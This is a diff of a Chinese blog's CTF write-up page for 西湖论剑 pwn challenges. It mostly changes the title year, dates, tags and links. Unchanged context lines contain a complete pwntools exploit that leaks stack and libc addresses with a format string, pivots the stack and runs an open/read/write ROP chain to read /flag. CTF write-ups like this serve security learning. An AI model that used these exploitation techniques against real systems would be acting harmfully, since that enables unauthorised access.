@@ -18,22 +18,22 @@
   
     <meta name="description" content="今年西湖论剑~">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2022西湖论剑线上赛pwn">
+<meta property="og:title" content="2023西湖论剑线上赛pwn">
 <meta property="og:url" content="https://nqoinaen.github.io/2023/02/02/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86pwn/index.html">
 <meta property="og:site_name" content="nqoinaen&#39;s blog">
 <meta property="og:description" content="今年西湖论剑~">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-02-02T11:00:00.000Z">
-<meta property="article:modified_time" content="2023-02-03T11:23:58.683Z">
+<meta property="article:modified_time" content="2023-05-19T13:18:46.552Z">
 <meta property="article:author" content="nqoinaen">
 <meta property="article:tag" content="rop">
-<meta property="article:tag" content="orw">
 <meta property="article:tag" content="Stack migration">
+<meta property="article:tag" content="orw">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>2022西湖论剑线上赛pwn - nqoinaen&#39;s blog</title>
+  <title>2023西湖论剑线上赛pwn - nqoinaen&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -210,7 +210,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle">2022西湖论剑线上赛pwn</span>
+            <span id="subtitle">2023西湖论剑线上赛pwn</span>
           
         </div>
 
@@ -287,12 +287,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">2022西湖论剑线上赛pwn</h1>
+            <h1 style="display: none">2023西湖论剑线上赛pwn</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年2月3日 晚上
+                    本文最后更新于：2023年5月19日 晚上
                   
                 
               </p>
@@ -307,7 +307,6 @@
 <p>格式化字符串泄露栈和libc，栈迁移到前面执行布置的rop去orw</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">23492</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims 			:r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;name:&#x27;</span>,<span class="hljs-string">&#x27;%p,%22$p&#x27;</span>)<br><br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>stack=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>info(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x22c5e0</span><br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><br>leave_ret=<span class="hljs-number">0x00000000004012e1</span><br>pop_rdi=<span class="hljs-number">0x0000000000401413</span><br>pop_rsi=libc_base+<span class="hljs-number">0x000000000002601f</span><br>pop_rdx=libc_base+<span class="hljs-number">0x0000000000142c92</span><br><br>pd=<span class="hljs-string">b&quot;/flag\x00\x00\x00&quot;</span><br>pd+=flat(pop_rdi,stack+<span class="hljs-number">0x10</span>,pop_rsi,<span class="hljs-number">0</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>])<br>pd+=flat(pop_rdi,<span class="hljs-number">3</span>,pop_rsi,stack-<span class="hljs-number">0x100</span>,pop_rdx,<span class="hljs-number">0x40</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])<br>pd+=flat(pop_rdi,<span class="hljs-number">1</span>,pop_rsi,stack-<span class="hljs-number">0x100</span>,pop_rdx,<span class="hljs-number">0x40</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])<br>pd=pd.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pd+=p64(stack+<span class="hljs-number">0x10</span>)+p64(leave_ret)<br><span class="hljs-comment">#debug()</span><br>sa(<span class="hljs-string">&#x27;DASCTF:&#x27;</span>,pd)<br>r.interactive()<br></code></pre></td></tr></table></figure>
 <h2 id="babycalc">babycalc</h2>
-<p>不会做，复现的</p>
 <p>覆盖最后一个变量能往指定偏移写字节</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">int <span class="hljs-selector-tag">i</span>; // <span class="hljs-selector-attr">[rsp+FCh]</span> <span class="hljs-selector-attr">[rbp-4h]</span><br></code></pre></td></tr></table></figure>
 <p>配合这个</p>
@@ -352,9 +351,9 @@
       
         <a href="/tags/rop/">#rop</a>
       
-        <a href="/tags/orw/">#orw</a>
-      
         <a href="/tags/Stack-migration/">#Stack migration</a>
+      
+        <a href="/tags/orw/">#orw</a>
       
     </div>
   
@@ -366,7 +365,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>2022西湖论剑线上赛pwn</div>
+      <div>2023西湖论剑线上赛pwn</div>
       <div>https://nqoinaen.github.io/2023/02/02/2022西湖论剑部分pwn/</div>
     </div>
     <div class="license-meta">
@@ -385,7 +384,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年2月3日</div>
+          <div>2023年5月19日</div>
         </div>
       
       
@@ -416,9 +415,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/02/05/bop/" title="bop">
+                      <a href="/2023/02/05/kernel%E5%85%A5%E9%97%A8/" title="kernel pwn入门">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">bop</span>
+                        <span class="hidden-mobile">kernel pwn入门</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -426,8 +425,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/01/31/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91easykernel/" title="2021西湖论剑线上赛easykernel">
-                        <span class="hidden-mobile">2021西湖论剑线上赛easykernel</span>
+                      <a href="/2023/01/12/23%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5wp/" title="2023山石冬令营pwn">
+                        <span class="hidden-mobile">2023山石冬令营pwn</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
